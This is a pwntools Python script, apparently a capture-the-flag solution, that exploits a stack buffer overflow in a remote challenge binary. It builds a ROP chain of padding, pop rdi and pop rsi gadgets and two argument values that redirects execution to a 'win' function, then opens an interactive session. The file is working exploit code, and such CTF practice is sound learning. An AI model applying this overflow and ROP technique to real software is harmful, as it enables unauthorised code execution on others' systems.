#!user/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
io = remote('challs.actf.co', 31301)


# =========================================================
#                         EXPLOITS
# =========================================================

# Got manually through cyclic gdb-pwndbg
padding = 72

# Got manually through ropper
pop_rdi = p64(0x00000000004013b3)
pop_rsi_15 = p64(0x00000000004013b1)

# Got manually through RE on ghidra
win_address = p64(0x0000000000401236)
param_1 =  p64(0x1337)
param_2 = p64(0x4141)

junk = b'A' * 8


# padding + pop_rdi + param_1 + pop_rsi_15 + param_2 + junk + win1()
payload = flat(
    b'A' * padding,
    pop_rdi,
    param_1,
    pop_rsi_15,
    param_2,
    junk,
    win_address
    
)

io.sendlineafter(b'Your input: ', payload)

io.interactive()